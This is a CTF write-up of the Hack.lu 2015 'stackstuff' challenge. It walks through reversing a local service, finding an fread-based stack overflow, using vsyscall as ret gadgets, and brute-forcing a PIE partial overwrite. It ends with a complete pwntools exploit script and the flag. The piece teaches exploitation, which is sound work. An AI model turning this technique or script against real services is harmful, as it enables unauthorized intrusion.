---
layout: post
title: Hacklu 2015 stackstuff
date: 2025-07-08 13:23:09 +0300
categories: Nightmare-series partial-overwrite
tags: nightmare buffer-overflow vsyscall x64 partial-overwrite brute-force
---

## Information 
- Category: Pwn
- Points:  --

## Description
> None

## Write-up
First, let’s run the program and see what it does:
<img src="/images/stuff/run.png" style="border-radius: 14px;">

As you can see, nothing happens when we run the program.
So let's do some reverse engineering to figure out what it's actually doing.

<img src="/images/stuff/rev.png" style="border-radius: 14px;">

As you can see, the program is listening on port ```0x5ea```, which is ```1514``` in decimal (after applying ```htons```).
So we can interact with the program using **netcat** on ```localhost``` port ```1514```:
```bash 
nc 127.0.0.1 1514

```
Now we want to see what the program is actually doing by connecting to port 1514 and checking its response.

<img src="/images/stuff/a.png" style="border-radius: 14px;">

Now we know that the program first reads an integer as a length, then reads that number of bytes from our input.
To check if there's a **buffer overflow**, we need to understand the logic behind this behavior.
So let’s go back to **Ghidra** and find the function that handles this input to analyze it more closely.

<img src="/images/stuff/p.png" style="border-radius: 14px;">

> From the reference string, you can find the function and use **Xref** to locate where it's called.
{: .prompt-tip}

<img src="/images/stuff/l.png" style="border-radius: 14px;">

The program uses ```fread()``` and lets the user decide how many bytes to read.
This makes it easy to create a **buffer overflow** by giving it a large size.

In the next step, we’ll calculate the offset to the **return address**.
But how do we do that?
We'll use **pwndbg** and set a breakpoint inside fread to examine the stack and memory layout.

```bash
gdb -q stackstuff
pwndbg: loaded 201 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from stackstuff...
Download failed: Connection refus
.
.
.
pwndbg> b*check_password_correct + 167
Breakpoint 1 at 0xf79
pwndbg> start
...
pwndbg> c
```

Then, make sure the program is listening by connecting to it:
```
nc 127.0.0.1 1514
Hi! This is the flag download service.
To download the flag, you need to specify a password.
Length of password: 4
ABCD
```
Now, after sending some random data to the program, let’s switch to **pwndbg** and see what’s happening under the hood:
```bash

[Switching to Thread 0x7ffff7dae740 (LWP 113323)]

Thread 2.1 "exe" hit Breakpoint 1, 0x0000555555400f79 in check_password_correct ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─[ REGISTERS / show-flags off / show-compact-regs off ]──
 RAX  0x7fffffffdec0 ◂— 0
 RBX  0
 RCX  0x7ffff7f978e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 RDX  4
 RDI  0x7fffffffdec0 ◂— 0
 RSI  1
 R8   0
 R9   0
 R10  0
 R11  0x202
 R12  0x7fffffffe0f8 —▸ 0x7fffffffe53d ◂— 0x4100636578656572 /* 'reexec' */
 R13  1
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 —▸ 0x555555400000 ◂— jg 0x555555400047
 R15  0
 RBP  0x7fffffffe070 —▸ 0x7fffffffe0d0 ◂— 0
 RSP  0x7fffffffdeb0 —▸ 0x7fffffffdee0 ◂— 0
 RIP  0x555555400f79 (check_password_correct+167) ◂— call fread@plt
──────────[ DISASM / x86-64 / set emulate on ]───────────
 ► 0x555555400f79 <check_password_correct+167>    call   fread@plt                   <fread@plt>
        ptr: 0x7fffffffdec0 ◂— 0 
        size: 1
        n: 4
        stream: 0x7ffff7f978e0 (_IO_2_1_stdin_) ◂— 0xfbad2088

... ↓            5 skipped
──────────────────────[ BACKTRACE ]──────────────────────
 ► 0   0x555555400f79 check_password_correct+167
...
pwndbg> p/x $rdi
$2 = 0x7fffffffdec0
pwndbg> i f
Stack level 0, frame at 0x7fffffffdf10:
 rip = 0x555555400f79 in check_password_correct;
    saved rip = 0x555555400fd1
 called by frame at 0x7fffffffdf20
 Arglist at 0x7fffffffdea8, args:
 Locals at 0x7fffffffdea8, Previous frame's sp is 0x7fffffffdf10
 Saved registers:
  rip at 0x7fffffffdf08
pwndbg> p/x 0x7fffffffdf08 - $2
$3 = 0x48
pwndbg>
```
So the offset is ```0x48``` (72 bytes).
That means we need to send **72 bytes** to reach and control the return address.

> The program has **PIE** and **NX** mitigations enabled.
{: .prompt-info}

Before exiting ```pwndbg```, there’s one important thing to note:
The **stack must be properly aligned** before calling a function — especially when we're trying to return into one to get the flag.

Since this binary has **PIE** enabled, we can’t hardcode return addresses as usual.
But there's a trick: we can use a **vsyscall** address as a fake ```ret``` instruction.

```vsyscall``` is an old mechanism for system calls. Its address is **static** and doesn't change, even with PIE.

This makes it useful as a **ROP NOP** — a return instruction that helps us align the stack or chain our gadgets safely.
```bash
pwndbg> vmmap
...
0xffffffffff600000 0xffffffffff601000 --xp     1000       0 [vsyscall]
pwndbg>
```

Earlier, we mentioned that there’s a hidden function in the binary that prints the flag — but where is it exactly?

In **Ghidra**, we can find it easily. Here's what it looks like:
<img src="/images/stuff/o.png" style="border-radius: 14px;">

As you can see, this function directly calls the flag-printing logic.
Our goal is to redirect execution to this function after bypassing protections.

```bash
   0x0000555555401086 <+172>:	call   0x555555400fba <require_auth>
   0x000055555540108b <+177>:	lea    rsi,[rip+0x36d]        # 0x5555554013ff
   0x0000555555401092 <+184>:	lea    rdi,[rip+0x3b6]        # 0x55555540144f
   0x0000555555401099 <+191>:	call   0x555555400cd0 <fopen@plt>
```
Now we have a function that opens the flag, located at address ending in ```0x8b``` (```0x55555540108b```).
Because the binary uses **PIE**, the base address is randomized — but **the last byte stays the same**.

That means we only need to **brute-force the upper byte(s)** of the address.
Since PIE randomizes a small portion (typically 4 bits in local), there are only ```2^4 = 16``` possibilities.

So, with at most **16 attempts**, we can guess the correct address and jump to the flag function.

## Exploit
```python
from pwn import *

context.binary = './stackstuff'
context.log_level = 'debug'

vsyscall_ret = p64(0xffffffffff600800)
padding = b"A" * 0x48
fixed_byte = b"\x8b"

def conn():
    return remote('127.0.0.1', 1514)

def make_payload(i):
    return padding + vsyscall_ret * 2 + fixed_byte + bytes([i])

def send_payload(r, payload):
    try:
        r.sendline(b'90')
        r.sendline(payload)
        r.recvuntil(b"Length of password: ")
        line = r.recvline(timeout=2)
        log.success(f"Flag line: {line.decode(errors='ignore')}")
        return True
    except EOFError:
        return False
    except Exception as e:
        log.warning(f"Exception while receiving: {e}")
        return False

def main():
    i = 0x00
    while i <= 0xFF:
        log.info(f"Trying byte: {hex(i)}")
        r = conn()
        payload = make_payload(i)
        if send_payload(r, payload):
            log.success(f"Correct byte found: {hex(i)}")
            pause()
            break
        else:
            log.info(f"Byte {hex(i)} failed.")
            i += 0x10
        r.close()

if __name__ == "__main__":
    main()
```

## Flag
Flag: ```flag{g0ttem_b0yz}```
